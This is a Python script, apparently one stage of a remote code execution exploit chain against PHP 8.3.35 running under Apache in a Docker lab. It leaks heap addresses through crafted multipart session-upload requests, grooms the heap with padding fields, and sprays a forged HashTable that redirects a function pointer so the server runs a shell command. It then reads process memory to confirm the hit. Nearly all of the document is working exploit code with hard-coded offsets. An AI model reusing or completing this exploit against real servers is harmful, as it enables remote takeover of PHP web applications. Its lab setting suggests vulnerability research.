"""8.3.35 stage-3 diagnostic: measure where the carrier lands relative to R.
R = PS(http_session_vars).value (the zend_reference in the heap).
The carrier must overwrite R. This script:
  1. Runs stage-1 leak to get chunk_base.
  2. Sends request A (setup) with a given pad config -> creates session + R.
  3. Reads R = PS(http_session_vars).value.
  4. Reads the 24 bytes at R (the zend_reference) BEFORE request B.
  5. Sends request B (write) with the carrier.
  6. Reads the 24 bytes at R AFTER request B.
  7. Reports if R was overwritten (carrier landed) and by what.
"""
import os
import subprocess, sys, time, os, struct, importlib.util

BASE = os.path.dirname(os.path.abspath(__file__))
C = "p2s8335"
PORT = 18112
PSG_OFF = 0x10432a0   # ps_globals offset in libphp.so (8.3.35)
HSV_OFF = 0x150       # PS(http_session_vars) offset in ps_globals (8.3.35)

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
E = importlib.util.module_from_spec(spec)
spec.loader.exec_module(E)

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def get_worker():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    wpid = pids[-1]
    r = sh(f'docker exec {C} sh -c "grep libphp /proc/{wpid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return wpid, B

def read_mem(wpid, addr, size):
    r = subprocess.run(
        f'docker exec {C} sh -c "dd if=/proc/{wpid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

def rotate():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    if len(pids) >= 2:
        sh(f'docker exec {C} kill -9 {pids[-1]}')
    time.sleep(1.0)
    for _ in range(20):
        r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
        if len(r.stdout.strip().splitlines()) >= 2:
            return
        time.sleep(0.5)

def run(pad_desc, pads, htdata_off=0x690d8, carrier_mode=True):
    wpid, B = get_worker()
    ps_base = B + PSG_OFF
    ps_hsv = ps_base + HSV_OFF

    t = E.Target(f"http://127.0.0.1:{PORT}/index.php", timeout=120, verbose=False)

    # --- stage-1 leak to get chunk_base ---
    # (reuse exploit's stage1; but simpler: just fire the OOM request and parse cookie)
    parts_s1 = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts_s1 += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    resp = t.post(E.build_multipart(parts_s1, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    raw = E.parse_cookie(resp)
    # chunk base = most common 2MB-aligned pointer in the cookie
    from collections import Counter
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk_base = c.most_common(1)[0][0] if c else 0
    print(f"  chunk_base=0x{chunk_base:x} (cookie={len(raw)}B)", flush=True)

    htdata = chunk_base + htdata_off
    zif = B + 0x3ac080

    # --- request A (setup) ---
    parts_a = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(pads):
        name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts_a.append({"name": name, "data": b"V" * vl})
    parts_a.append({"name": "f", "filename": "a.txt", "data": b"A" * 64})
    parts_a.append({"name": "big", "data": b"B" * (12 * 1024 * 1024)})
    t.post(E.build_multipart(parts_a, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120,
           extra_headers={"Cookie": "PHPSESSID=" + "a" * 32})
    time.sleep(0.3)

    # Read R = PS(http_session_vars).value
    data = read_mem(wpid, ps_hsv, 16)
    R = struct.unpack("<Q", data[:8])[0] if len(data) >= 8 else 0
    # read the zend_reference at R (24 bytes)
    ref_before = read_mem(wpid, R, 24) if R else b""
    print(f"  R=0x{R:x}", flush=True)
    if ref_before:
        print(f"  ref_before: {ref_before.hex()}", flush=True)

    # --- request B (write) ---
    # build fake HashTable
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E_off = 0x20
    struct.pack_into("<Q", ht, E_off + 0x00, 0)
    struct.pack_into("<Q", ht, E_off + 0x08, 0)
    struct.pack_into("<Q", ht, E_off + 0x10, zif)
    struct.pack_into("<Q", ht, E_off + 0x18, 0)
    struct.pack_into("<Q", ht, E_off + 0x20, 0)
    struct.pack_into("<I", ht, E_off + 0x28, 0)
    struct.pack_into("<I", ht, E_off + 0x2C, 1)
    struct.pack_into("<Q", ht, E_off + 0x30, 0)
    struct.pack_into("<Q", ht, E_off + 0x38, 0)
    struct.pack_into("<I", ht, E_off + 0x40, 0)
    struct.pack_into("<Q", ht, E_off + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E_off + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, 10)
    ht[0x98:0x98 + 10] = b"id>/www/p1"
    ht[0x98 + 10] = 0
    ht = bytes(ht)

    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts_b = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    if carrier_mode:
        for i in range(2):
            parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
        parts_b.append({"name": "g00", "data": carrier})
        for i in range(15):
            parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})
    else:
        for i in range(15):
            parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})
        for i in range(2):
            parts_b.append({"name": f"f{i:02d}", "data": b"R" * 15})
    t.post(E.build_multipart(parts_b, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)
    time.sleep(0.3)

    # Read R again + the zend_reference at R (after request B)
    data_b = read_mem(wpid, ps_hsv, 16)
    R_b = struct.unpack("<Q", data_b[:8])[0] if len(data_b) >= 8 else 0
    ref_after = read_mem(wpid, R_b, 24) if R_b else b""
    print(f"  R_b=0x{R_b:x}", flush=True)
    if ref_after:
        print(f"  ref_after:  {ref_after.hex()}", flush=True)
    if ref_before and ref_after:
        if ref_before[:15] == ref_after[:15]:
            print(f"  *** R NOT OVERWRITTEN (carrier missed) ***", flush=True)
        else:
            print(f"  *** R OVERWRITTEN (carrier hit!) ***", flush=True)

    # Check for RCE proof
    r = sh(f'docker exec {C} sh -c "cat /www/p1 2>/dev/null || cat /out/p1 2>/dev/null"')
    proof = r.stdout.strip()
    if proof:
        print(f"  *** RCE PROOF: {proof} ***", flush=True)
    return proof

print("=== 8.3.35 stage-3 diagnostic ===", flush=True)
print(f"\n--- bookworm pads [(31,31)]*6, carrier mode ---", flush=True)
p = run("bookworm", [(31, 31)] * 6, carrier_mode=True)
rotate()

if not p:
    print(f"\n--- no-carrier mode (15x ht + 2x ref) ---", flush=True)
    p = run("nocarrier", [(31, 31)] * 6, carrier_mode=False)
    rotate()

print(f"\n=== done ===", flush=True)
